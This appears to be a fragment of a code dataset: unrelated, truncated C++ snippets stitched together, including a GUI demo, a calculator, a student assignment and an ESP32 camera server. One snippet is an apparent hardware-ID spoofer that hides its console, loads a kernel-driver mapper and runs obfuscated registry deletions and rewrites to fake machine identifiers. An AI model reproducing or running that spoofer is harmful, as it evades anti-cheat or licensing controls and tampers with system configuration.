if(!std::filesystem::exists(m_argv[i + 1]))\n            {\n                printf(\"%s not not found!\\n\", m_argv[i + 1]);\n                return false;\n            }\n            std::filesystem::current_path(m_argv[i+1]);\n            m_sourceList.addDirectory(std::filesystem::current_path());\n        }\n        \n        else if (strcmp(m_argv[i], \"-a\") == 0)\n        {\n            CHECK_ARG(\"-a\", m_argv, i, m_argc);\n            if (!parseAnalyzerArg(m_argv[i+1]))\n                return false;\n        }\n        else if (strcmp(m_argv[i], \"-f\") == 0)\n        {\n            CHECK_ARG(\"-f\", m_argv, i, m_argc);\n            if (!parseTargetFiles(m_argv[i+1]))\n                return false;\n        }\n\n        else if (strcmp(m_argv[i], \"-o\") == 0)\n        {\n            CHECK_ARG(\"-o\", m_argv, i, m_argc);\n            if (!parseOutputType(m_argv[i + 1]))\n                return false;\n        }\n\n    }\n\n    if (m_output == nullptr)\n        m_output = std::make_shared<TerminalStrategy>();\n    return true;\n}\n\nbool TerminalInterface::parseAnalyzerArg(const char* arg)\n{\n    if (strcmp(arg, \"forward\") == 0)\n        m_analyzers |= ANALYZER_FORWARD;\n    else if (strcmp(arg, \"reverse\") == 0)\n        m_analyzers |= ANALYZER_REVERSE;\n    else if (strcmp(arg, \"circle\") == 0)\n        m_analyzers |= ANALYZER_CIRCLE;\n    else if (strcmp(arg, \"icircle\") == 0)\n        m_analyzers |= ANALYZER_ICIRCLE;\n    else if (strcmp(arg, \"transient\") == 0 || strcmp(arg, \"bacon-num\") == 0)\n        m_analyzers |= ANALYZER_TRANSIENT;\n    else\n    {\n        std::cerr << \"Unknown analyzer \\\"\" << arg << \"\\\". \"\n                  << \"Supported analyzers are: forward, reverse, circle, icircle, and transient.\\n\";\n        return false;\n    }\n\n    return true;\n}\n\nbool Termina",
    "#include \"Gui/Theme.hpp\"\n#include \"Gui/Gui.hpp\"\n#include <SFML/Graphics.hpp>\n\n\nsf::Color hex2color(const std::string& hexcolor)\n{\n    sf::Color color = sf::Color::Black;\n    if (hexcolor.size() == 7) // #ffffff\n    {\n        color.r = strtoul(hexcolor.substr(1, 2).c_str(), NULL, 16);\n        color.g = strtoul(hexcolor.substr(3, 2).c_str(), NULL, 16);\n        color.b = strtoul(hexcolor.substr(5, 2).c_str(), NULL, 16);\n    }\n    else if (hexcolor.size() == 4) // #fff\n    {\n        color.r = strtoul(hexcolor.substr(1, 1).c_str(), NULL, 16) * 17;\n        color.g = strtoul(hexcolor.substr(2, 1).c_str(), NULL, 16) * 17;\n        color.b = strtoul(hexcolor.substr(3, 1).c_str(), NULL, 16) * 17;\n    }\n    return color;\n}\n\nstruct Theme\n{\n    sf::Color backgroundColor;\n    std::string texturePath;\n};\n\nint main()\n{\n    Theme defaultTheme = {\n        hex2color(\"#dddbde\"),\n        \"demo/texture-default.png\"\n    };\n\n    Theme win98Theme = {\n        hex2color(\"#d4d0c8\"),\n        \"demo/texture-win98.png\"\n    };\n\n    // Create the main window\n    sf::RenderWindow app(sf::VideoMode(800, 600), \"SFML Widgets\", sf::Style::Close);\n    app.setFramerateLimit(60);\n\n    gui::Menu menu(app);\n    menu.setPosition(10, 10);\n\n    gui::Theme::loadFont(\"demo/tahoma.ttf\");\n    gui::Theme::loadTexture(defaultTheme.texturePath);\n    gui::Theme::textSize = 11;\n    gui::Theme::click.textColor      = hex2color(\"#191B18\");\n    gui::Theme::click.textColorHover = hex2color(\"#191B18\");\n    gui::Theme::click.textColorFocus = hex2color(\"#000\");\n    gui::Theme::input.textColor = hex2color(\"#000\");\n    gui::Theme::input.textColorHover = hex2color(\"#000\");\n    gui::Theme::input.textColorFocus = hex2color(\"#000\");\n    gui::Theme::input.textSelectionColor = hex2color(\"#8791AD\");\n    gui::Theme::input.textPlaceholderColor = hex2color(\"#8791AD\");\n    gui::Theme::PADDING = 2.f;\n    gui::Theme::windowBgColor = defaultTheme.backgroundColor;\n\n    gui::HBoxLayout* hbox = menu.addHBoxLayout();\n    gui::FormLayout* form = hbox->addFormLayout();\n\n    sf::Text text(\"Hello world!\", gui::Theme::getFont());\n    text.setOrigin(text.getLocalBounds().width / 2, text.getLocalBounds().height / 2);\n    text.setPosition(480, 240);\n\n    // Textbox\n    gui::TextBox* textbox = new gui::TextBox();\n    textbox->setText(\"Hello world!\");\n    textbox->setCallback([&]() {\n        text.setString(textbox->getText());\n        text.setOrigin(text.getLocalBounds().width / 2, text.getLocalBounds().height / 2);\n    });\n    textbox->setPlaceholder(\"Type something!\");\n    form->addRow(\"Text\", textbox);\n\n    gui::TextBox* textbox2 = new gui::TextBox();\n    textbox2->setText(\"Hello world!\");\n    textbox2->setMaxLength(5);\n    form->addRow(\"Text with limit (5)\", textbox2);\n\n    // Slider + ProgressBar for rotation\n    gui::Slider* sliderRotation = new gui::Slider();\n    gui::ProgressBar* pbarRotation1 = new gui::ProgressBar(200.f, gui::Horizontal, gui::LabelNone);\n    gui::ProgressBar* pbarRotation2 = new gui::ProgressBar(200.f, gui::Horizontal, gui::LabelOver);\n    gui::ProgressBar* pbarRotation3 = new gui::ProgressBar(200.f, gui::Horizontal, gui::LabelOutside);\n\n    sliderRotation->setStep(1);\n    sliderRotation->setCallback([&]() {\n        text.setRotation(sliderRotation->getValue() * 360 / 100.f);\n        pbarRotation1->setValue(sliderRotation->getValue());\n        pbarRotation2->setValue(sliderRotation->getValue());\n        pbarRotation3->setValue(sliderRotation->getValue());\n    });\n    form->addRow(\"Rotation\", sliderRotation);\n\n    // Slider + ProgressBar for scale\n    gui::Slider* sliderScale = new gui::Slider();\n    gui::ProgressBar* pbarScale1 = new gui::ProgressBar(100, gui::Vertical, gui::LabelNone);\n    gui::ProgressBar* pbarScale2 = new gui::ProgressBar(100, gui::Vertical, gui::LabelOver);\n    gui::ProgressBar* pbarScale3 = new gui::ProgressBar(100, gui::Vertical, gui::LabelOutside);\n    sliderScale->setCallback([&]() {\n        float scale = 1 + sliderScale->getValue() * 2 / 100.f;\n        text.setScale(scale, scale);\n        pbarScale1->setValue(sliderScale->getValue());\n        pbarScale2->setValue(sliderScale->getValue());\n        pbarScale3->setValue(sliderScale->getValue());\n    });\n    form->addRow(\"Scale\", sliderScale);\n\n    // OptionsBox for color\n    gui::OptionsBox<sf::Color>* opt = new gui::OptionsBox<sf::Color>();\n    opt->addItem(\"Red\", sf::Color::Red);\n    opt->addItem(\"Blue\", sf::Color::Blue);\n    opt->addItem(\"Green\", sf::Color::Green);\n    opt->addItem(\"Yellow\", sf::Color::Yellow);\n    opt->addItem(\"White\", sf::Color::White);\n    opt->setCallback([&]() {\n        text.setFillColor(opt->getSelectedValue());\n    });\n    form->addRow(\"Color\", opt);\n\n    // Checbkox\n    gui::CheckBox* checkboxBold = new gui::CheckBox();\n    checkboxBold->setCallback([&]() {\n        int style = text.getStyle();\n        if (checkboxBold->isChecked())\n            style |= sf::Text::Bold;\n        else\n            style &= ~sf::Text::Bold;\n        text.setStyle(style);\n    });\n    form->addRow(\"",
    "//StHomeLess#2465\r\n#pragma once\r\n#include <iostream>\r\n#include <urlmon.h>\r\n\r\n#include \"xhackorx.hpp\"\r\n#include \"mac.h\"\r\n#include \"kdmapper.hpp\"\r\n#include \"driver.h\"\r\n\r\n#pragma comment(lib, \"urlmon.lib\")\r\n#define _CRT_SECURE_NO_WARNINGS\r\n#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))\r\n#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))\r\n\r\n//---------------UTILS--------------//\r\n\r\nusing namespace std;\r\nvoid HideConsole()\r\n{\r\n\t::ShowWindow(::GetConsoleWindow(), SW_HIDE);\r\n}\r\n\r\nvoid ShowConsole()\r\n{\r\n\t::ShowWindow(::GetConsoleWindow(), SW_SHOW);\r\n}\r\n\r\n//---------------REGS--------------//\r\n\r\nint regedit()\r\n{\r\n\tHideConsole();\r\n\tsystem(XorString(\"reg delete HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\TimeZoneInformation /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion\\\\Notifications\\\\Data /v 418A073AA3BC3475 /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f\"));\r\n\tsystem(XorString(\"reg delete HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0 /f\") );\r\n\tsystem(XorString(\"REG ADD HKCU\\\\Software\\\\Microsoft\\\\Direct3D /v WHQLClass /t REG_BINARY /d %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ComputerName\\\\ActiveComputerName /v ComputerName /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WindowsUpdate /v SusClientId /t REG_SZ /d %random%%random%-%random%-%random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\HardwareConfig /v LastConfig /t REG_SZ /d {%random%-%random%-%random} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\HardwareConfig\\\\Current /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\Software\\\\Microsoft /v BuildLab /t REG_SZ /d %random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\Software\\\\Microsoft /v BuildLabEx /t REG_SZ /d %random%-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS /v BaseBoardProduct /t REG_SZ /d %random%-%random%%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\kbdclass\\\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\mouhid\\\\Parameters /v WppRecorder_TraceGuid /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Class\\\\{4d36e968-e325-11ce-bfc1-08002be10318}\\\\0000 /v UserModeDriverGUID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildBranch /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildGUID /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\" \\\"NT\\\\CurrentVersion /v BuildLab /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi\\\" \\\"Port\\\" \\\"0\\\\Scsi\\\" \\\"Bus\\\" \\\"0\\\\Target\\\" \\\"Id\\\" \\\"0\\\\Logical\\\" \\\"Unit\\\" \\\"Id\\\" \\\"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\Scsi\\\\Scsi\\\" \\\"Port\\\" \\\"1\\\\Scsi\\\" \\\"Bus\\\" \\\"0\\\\Target\\\" \\\"Id\\\" \\\"0\\\\Logical\\\" \\\"Unit\\\" \\\"Id\\\" \\\"0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\MultifunctionAdapter\\\\0\\\\DiskController\\\\0\\\\DiskPeripheral\\\\0 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\HARDWARE\\\\DESCRIPTION\\\\System\\\\MultifunctionAdapter\\\\0\\\\DiskController\\\\0\\\\DiskPeripheral\\\\1 /v Identifier /t REG_SZ /d %random%-%random%-%random%-%random%%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\ControlSet001\\\\Services\\\\BasicDisplay\\\\Video /v VideoID /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\SQMClient /v MachineId /t REG_SZ /d {%random%-%random%-%random%-%random%%random%} /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters /v Hostname /t REG_SZ /d DESKTOP-%random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters /v Domain /t REG_SZ /d %random% /f\") );\r\n\tsystem(XorString(\"REG ADD HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\DevQuery\\\\6 /v UUID /t R",
    "// Author: Brij Malhotra\n// Filename: P4.cpp\n// Version: 1\n// Description: Driver program for P4\n\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <stdexcept>\n#include \"Formula.h\"\n#include \"Plan.h\"\n#include \"ExecutablePlan.h\"\n#include <string>\n\nconst int MAX_PLANS = 6;\n\n// Function prototype declarations\nPlan* GetPlan();\nvoid SimulatePlans(Plan* planDB[], int size);\nshared_ptr<Stockpile> getStockpile();\nPlan operator+(unsigned int x, const Plan& obj); // Commutativity for addition\n\nint main() {\n    Plan* planDB[MAX_PLANS];\n\n    for (int i = 0; i < MAX_PLANS; ++i) {\n        planDB[i] = GetPlan();\n    }\n\n    // Test operator overloading\n    cout << \"Testing operator overloading\" << endl << endl;\n    planDB[3] = planDB[1] + 5;\n    *planDB[4] = *planDB[5] + *planDB[6];\n    \n    // Test assignment operator and copy constructor\n    cout << \"Testing assignment operator and copy constructor\" << endl << endl;\n    Plan planX = *planDB[1];\n    Plan planY(*planDB[2]);\n\n    // Test comparison overloading\n    cout << \"Testing comparison operator overloading\" << endl << endl;\n    if (planDB[1] != planDB[4]){\n        cout << \"Plan 1 is not similar to Plan 2\" << endl;\n    } else {\n        cout << \"Plan 1 is similar to Plan 2\" << endl;\n    }\n\n    if (planDB[3] > planDB[5]){\n        cout << \"Plan 3 is greater than Plan 5\" << endl;\n    } else {\n        cout << \"Plan 5 is greater than Plan 3\" << endl;\n    }\n\n    if (planDB[2] <= planDB[3]){\n        cout << \"Plan 2 is either equal to or less than Plan 3\" << endl;\n    } else {\n        cout << \"Plan 2 is greater than Plan 3\" << endl;\n    }\n\n    planX.removeLastFormula();\n\n    if (*planDB[1] != planX){\n        cout << \"Plan 1 is not equal to Plan X\" << endl;\n    } else {\n        cout << \"Plan 1 is the same as Plan X\" << endl;\n    }\n\n    // Performing increment and shortcut operations\n    cout << \"Performing increment and shortcut operations\" << endl << endl;\n    planDB[1]++;\n    ++planDB[2];\n    planDB[3] += 5;\n    *planDB[3] += *planDB[4];\n    planDB[3] = 5 + planDB[2];\n    \n    cout << \"Simulating program functionality\" << endl << endl;\n    SimulatePlans(planDB, MAX_PLANS);\n\n    // Zero out objects\n    for (int i = 0; i < MAX_PLANS; ++i) {\n        delete planDB[i];\n        planDB[i] = nullptr;\n    }\n\n    return 0;\n}\n\nPlan operator+(unsigned int x, const Plan& obj){\n    Formula * test = nullptr;\n    Plan temp(0, test);\n    temp = obj + x;\n    return temp;\n}\n\nPlan* GetPlan() {\n    srand(time(nullptr));\n    int choice = rand() % 2 + 1;\n\n    int numFormulas = rand() % 4 + 2; // Random number of formulas between 2 to 5.\n    Formula* formulas = new Formula[numFormulas];\n    for (int i = 0; i < numFormulas; ++i) {\n        int inputQuantities[2] = {rand() % 10 + 1, rand() % 10 + 1};\n        string inputNames[2] = {\"InputA\" + std::to_string(i), \"InputB\" + std::to_string(i)};\n        string outputNames[2] = {\"OutputA\" + std::to_string(i), \"OutputB\" + std::to_string(i)};\n        int insize = 2;\n        int outsize = 2;\n        formulas[i] = Formula(insize, outsize, inputQuantities, inputNames, outputNames);\n    }\n\n    if (choice == 1) {\n        return new Plan(numFormulas, formulas);\n    } else if (choice == 2) {\n        return new ExecutablePlan(numFormulas, formulas);\n    } else {\n        throw runtime_error(\"No Plan object created\");\n    }\n}\n\nshared_ptr<Stockpile> getStockpile(){\n\n    vector<int> initialResources = {50, 50 , 50, 50, 50, 50, 50, 50, 50};\n\n    shared_ptr<Stockpile> stocks(new Stockpile(initialResources));\n\n    return stocks;\n}\n\nvoid SimulatePlans(Plan* planDB[], int size) {\n    srand(time(nullptr));\n\n    int simulations = rand() % 16 + 5;\n\n    for (int i = 0; i < size; ++i) {\n        for (int j = 0; j < simulations; ++j) {\n            int action = rand() % 4 + 1;\n\n            if (action == 1) {\n                // Add formula\n                int inputQuantities[] = { std::rand() % 10 + 1, std::rand() % 10 + 1 };\n                string inputNames[] = { \"ReplaceInputA\", \"ReplaceInputB\" };\n                string outputNames[] = { \"ReplaceOutputA\", \"ReplaceOutputB\" };\n                Formula newFormula(2, 2, inputQuantities, inputNames, outputNames);\n                planDB[i]->addFormula(newFormula);\n\n            } else if (action == 2) {\n                // Remove last formula\n                planDB[i]->removeLastFormula();\n            } else if (action == 3) {\n                \n                // Replace formula\n                if (planDB[i]->getNumFormulas() > 0) {\n\n                srand(static_cast<unsigned int>(time(nullptr)));\n\n                int index = rand() % planDB[i]->getNumFormulas();\n                int inputQuantities[] = { std::rand() % 10 + 1, std::rand() % 10 + 1 };\n                string inputNames[] = { \"ReplaceInputA\", \"ReplaceInputB\" };\n                string outputNames[] = { \"ReplaceOutputA\", \"ReplaceOutputB\" };\n                Formula newFormula(2, 2, inputQuantities, inputNames, outputNames);\n                planDB[i]->replaceFormula(ind",
    "#include \"../include/LinearStructuresGraphics.hpp\"\n#include \"Color.hpp\"\n#include \"Functions.hpp\"\n#include \"Vector2.hpp\"\n#include <cmath>\n#include <raylib-cpp.hpp>\n#include <raylib.h>\n#include <string>\n\nnamespace Graphics {\n\nint CenterNodeText(std::string nodeText, float nodeTextWidth, float nodeRadius,\n                   int fontSize) {\n  while (nodeTextWidth >\n         nodeRadius) { // change fontSize in cases where the text is too big\n    fontSize /= 2;\n    nodeTextWidth = raylib::MeasureText(nodeText.c_str(), fontSize);\n  }\n\n  return fontSize;\n}\n\ndouble ToRadians(double degree) {\n  double pi = 3.14159265359;\n  return (degree * (pi / 180));\n}\n\nvoid DrawSideNodeText(std::string sideNodeText,\n                      raylib::Vector2 sideNodeTextPosition) {\n  int sideNodeTextSize = 14;\n  float sideNodeTextWidth =\n      raylib::MeasureText(sideNodeText.c_str(), sideNodeTextSize);\n  float sideNodeTextHeight = sideNodeTextSize;\n\n  sideNodeTextPosition.x -= (sideNodeTextWidth / 2);\n  sideNodeTextPosition.y -= (sideNodeTextHeight / 2);\n  DrawText(sideNodeText, sideNodeTextPosition.x, sideNodeTextPosition.y,\n           sideNodeTextSize, raylib::Color::White());\n}\n\n/* TODO FIX DrawArrows\nvoid DrawArrows(raylib::Vector2 nodeCenter, raylib::Vector2 conectedNodeCenter,\n                int nodeRadius, raylib::Color arrowColor) {\n  if (lineText == \"anterior\") {\n    raylib::DrawText(\"anterior\", nodeCenter.x, nodeCenter.y - 35, 14,\n                     raylib::Color::Blue());\n    DrawLineV(nodeCenter, conectedNodeCenter, raylib::Color::Blue());\n  } else if (lineText == \"pr\u00f3ximo\") {\n    raylib::DrawText(\"pr\u00f3ximo\", nodeCenter.x, nodeCenter.y + 35, 14,\n                     raylib::Color::Blue());\n    DrawLineV(nodeCenter, conectedNodeCenter, raylib::Color::Blue());\n  }\n  // arrows\n  // initial point (45\u00ba)\n  raylib::Vector2 arrowStart = {\n      nodeCenter.x + (float)std::cos(ToRadians(45)) * nodeRadius,\n      nodeCenter.y + (float)std::sin(ToRadians(45)) * nodeRadius};\n\n  // final point (315\u00ba)\n  raylib::Vector2 arrowEnd = {\n      previousNodeCenter.x + (float)std::cos(ToRadians(315)) * nodeRadius,\n      previousNodeCenter.y + (float)std::sin(ToRadians(315)) * nodeRadius};\n\n  // arrow spline control points\n  raylib::Vector2 arrowControl = {(arrowStart.x + arrowEnd.x) / 2 + 30, // + 20\n                                  (arrowStart.y + arrowEnd.y) / 2};\n\n  DrawSplineSegmentBezierQuadratic(arrowStart, arrowControl, arrowEnd, 1,\n                                   arrowColor);\n\n\n}*/\n\nLinearStructuresGraphics::LinearStructuresGraphics(int fontSize,\n                                                   raylib::Vector2 nodeCenter,\n                                                   int nodeRadius, int nodeGap,\n                                                   raylib::Color fontColor,\n                                                   raylib::Color outlineColor) {\n  this->fontSize = fontSize;\n  this->nodeCenter = nodeCenter;\n  this->nodeRadius = nodeRadius;\n  this->nodeGap = nodeGap;\n  this->fontColor = fontColor;\n  this->outlineColor = outlineColor;\n}\n\nvoid LinearStructuresGraphics::DrawStack() {\n  nodeCenter.x = (float)GetScreenWidth() / 2;\n  nodeCenter.y = (float)GetScreenHeight() - 40;\n  outlineColor = raylib::Color(235, 111, 146);\n  fontColor = outlineColor;\n  for (int i = v.size() - 1; i >= 0; i--) {\n\n    if (i == v.size() - 1) {\n      // Draw TOP\n      DrawSideNodeText(\"TOPO\",\n                       {nodeCenter.x - 75, nodeCenter.y + (i * nodeGap)});\n    }\n    raylib::Vector2 previousNodeCenter = {nodeCenter.x,\n                                          (i - 1 * nodeGap) + nodeCenter.y};\n\n    std::string nodeText = std::to_string(v.at(i));\n    float nodeTextWidth = raylib::MeasureText(nodeText.c_str(), fontSize);\n    fontSize = CenterNodeText(nodeText, nodeTextWidth, nodeRadius, fontSize);\n    float nodeTextHeight = fontSize;\n\n    float textX = nodeCenter.x - (nodeTextWidth / 2);\n    float textY = (i * nodeGap) + nodeCenter.y - (nodeTextHeight / 2);\n    raylib::DrawText(nodeText, textX, textY, fontSize, fontColor);\n    DrawCircleLines(nodeCenter.x, (i * nodeGap) + nodeCenter.y, nodeRadius,\n                    outlineColor);\n\n    float nextTextWidth = raylib::MeasureText(\"anterior\", 14);\n    float nextTextHeight = 14;\n\n    raylib::Vector2 nextTextPosition = {nodeCenter.x - (nextTextWidth / 2),\n                                        (i * nodeGap) + nodeCenter.y -\n                                            (nextTextHeight / 2)};\n    raylib::DrawText(\"anterior\", nextTextPosition.x + 75,\n                     nextTextPosition.y + 35, 14, raylib::Color::Blue());\n\n    DrawLineV({nodeCenter.x, (i * nodeGap) + nodeCenter.y},\n              {previousNodeCenter.x, previousNodeCenter.y - 20},\n              raylib::Color::Blue());\n  }\n}\nvoid LinearStructuresGraphics::DrawQueue() {\n  nodeCenter.x = (float)GetScreenWidth() - 40;\n  nodeCenter.y = (float)GetScreenHeight() / 2;\n\n  outlineColor = raylib::Color(235, 188, 186);\n  fontColor = outlineColor;\n",
    "//C++ programming\r\n\r\n#include <iostream>\r\n#include <string>\r\nusing namespace std;\r\n\r\nclass Calculator \r\n{\r\n   public:double add(double a, double b) \r\n   {\r\n        return a + b;\r\n    }\r\n    double subtract(double a, double b)\r\n    {\r\n        return a - b;\r\n    }\r\n    double multiply(double a, double b)\r\n    {\r\n        return a * b;\r\n    }\r\n    double divide(double a, double b)\r\n    {\r\n        if (b != 0)\r\n        {\r\n            return a / b;\r\n        } \r\n        else \r\n        {\r\n            throw invalid_argument(\"Division by zero is not allowed.\");\r\n        }\r\n    }\r\n    double performOperation(double a, double b, const string& operation) \r\n    {\r\n        if (operation == \"add\")\r\n        {\r\n            return add(a, b);\r\n        }\r\n        else if (operation == \"subtract\")\r\n        {\r\n            return subtract(a, b);\r\n        }\r\n        else if (operation == \"multiply\")\r\n        {\r\n            return multiply(a, b);\r\n        }\r\n        else if (operation == \"divide\")\r\n        {\r\n            return divide(a, b);\r\n        }\r\n        else \r\n        {\r\n            throw invalid_argument(\"Invalid operation type.\");\r\n        }\r\n    }\r\n};\r\n\r\nint main() \r\n{\r\n    double a, b;\r\n    string operation;\r\n    cout << \"Enter two numbers (a and b): \";\r\n    cin >> a >> b;\r\n    cout << \"Enter the type of operation (add, subtract, multiply, divide): \";\r\n    cin >> operation;\r\n    Calculator calculator;\r\n    try \r\n    {\r\n    double result = calculator.performOperation(a, b, operation);\r\n        cout << \"Result: \" << result <<endl;\r\n    } \r\n    catch (const std::invalid_argument& e)\r\n    {\r\n        cout << \"Error: \" << e.what() <<endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "// Copyright 2015-2016 Espressif Systems (Shanghai) PTE LTD\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n#include \"esp_http_server.h\"\n#include \"esp_timer.h\"\n#include \"esp_camera.h\"\n#include \"img_converters.h\"\n#include \"camera_index.h\"\n#include \"Arduino.h\"\n\n#include \"fb_gfx.h\"\n#include \"fd_forward.h\"\n#include \"fr_forward.h\"\n\n#define ENROLL_CONFIRM_TIMES 5\n#define FACE_ID_SAVE_NUMBER 7\n\n#define FACE_COLOR_WHITE  0x00FFFFFF\n#define FACE_COLOR_BLACK  0x00000000\n#define FACE_COLOR_RED    0x000000FF\n#define FACE_COLOR_GREEN  0x0000FF00\n#define FACE_COLOR_BLUE   0x00FF0000\n#define FACE_COLOR_YELLOW (FACE_COLOR_RED | FACE_COLOR_GREEN)\n#define FACE_COLOR_CYAN   (FACE_COLOR_BLUE | FACE_COLOR_GREEN)\n#define FACE_COLOR_PURPLE (FACE_COLOR_BLUE | FACE_COLOR_RED)\n\ntypedef struct {\n        size_t size; //number of values used for filtering\n        size_t index; //current value index\n        size_t count; //value count\n        int sum;\n        int * values; //array to be filled with values\n} ra_filter_t;\n\ntypedef struct {\n        httpd_req_t *req;\n        size_t len;\n} jpg_chunking_t;\n\n#define PART_BOUNDARY \"123456789000000000000987654321\"\nstatic const char* _STREAM_CONTENT_TYPE = \"multipart/x-mixed-replace;boundary=\" PART_BOUNDARY;\nstatic const char* _STREAM_BOUNDARY = \"\\r\\n--\" PART_BOUNDARY \"\\r\\n\";\nstatic const char* _STREAM_PART = \"Content-Type: image/jpeg\\r\\nContent-Length: %u\\r\\n\\r\\n\";\n\nstatic ra_filter_t ra_filter;\nhttpd_handle_t stream_httpd = NULL;\nhttpd_handle_t camera_httpd = NULL;\n\nstatic mtmn_config_t mtmn_config = {0};\nstatic int8_t detection_enabled = 0;\nstatic int8_t recognition_enabled = 0;\nstatic int8_t is_enrolling = 0;\nstatic face_id_list id_list = {0};\n\nstatic ra_filter_t * ra_filter_init(ra_filter_t * filter, size_t sample_size){\n    memset(filter, 0, sizeof(ra_filter_t));\n\n    filter->values = (int *)malloc(sample_size * sizeof(int));\n    if(!filter->values){\n        return NULL;\n    }\n    memset(filter->values, 0, sample_size * sizeof(int));\n\n    filter->size = sample_size;\n    return filter;\n}\n\nstatic int ra_filter_run(ra_filter_t * filter, int value){\n    if(!filter->values){\n        return value;\n    }\n    filter->sum -= filter->values[filter->index];\n    filter->values[filter->index] = value;\n    filter->sum += filter->values[filter->index];\n    filter->index++;\n    filter->index = filter->index % filter->size;\n    if (filter->count < filter->size) {\n        filter->count++;\n    }\n    return filter->sum / filter->count;\n}\n\nstatic void rgb_print(dl_matrix3du_t *image_matrix, uint32_t color, const char * str){\n    fb_data_t fb;\n    fb.width = image_matrix->w;\n    fb.height = image_matrix->h;\n    fb.data = image_matrix->item;\n    fb.bytes_per_pixel = 3;\n    fb.format = FB_BGR888;\n    fb_gfx_print(&fb, (fb.width - (strlen(str) * 14)) / 2, 10, color, str);\n}\n\nstatic int rgb_printf(dl_matrix3du_t *image_matrix, uint32_t color, const char *format, ...){\n    char loc_buf[64];\n    char * temp = loc_buf;\n    int len;\n    va_list arg;\n    va_list copy;\n    va_start(arg, format);\n    va_copy(copy, arg);\n    len = vsnprintf(loc_buf, sizeof(loc_buf), format, arg);\n    va_end(copy);\n    if(len >= sizeof(loc_buf)){\n        temp = (char*)malloc(len+1);\n        if(temp == NULL) {\n            return 0;\n        }\n    }\n    vsnprintf(temp, len+1, format, arg);\n    va_end(arg);\n    rgb_print(image_matrix, color, temp);\n    if(len > 64){\n        free(temp);\n    }\n    return len;\n}\n\nstatic void draw_face_boxes(dl_matrix3du_t *image_matrix, box_array_t *boxes, int face_id){\n    int x, y, w, h, i;\n    uint32_t color = FACE_COLOR_YELLOW;\n    if(face_id < 0){\n        color = FACE_COLOR_RED;\n    } else if(face_id > 0){\n        color = FACE_COLOR_GREEN;\n    }\n    fb_data_t fb;\n    fb.width = image_matrix->w;\n    fb.height = 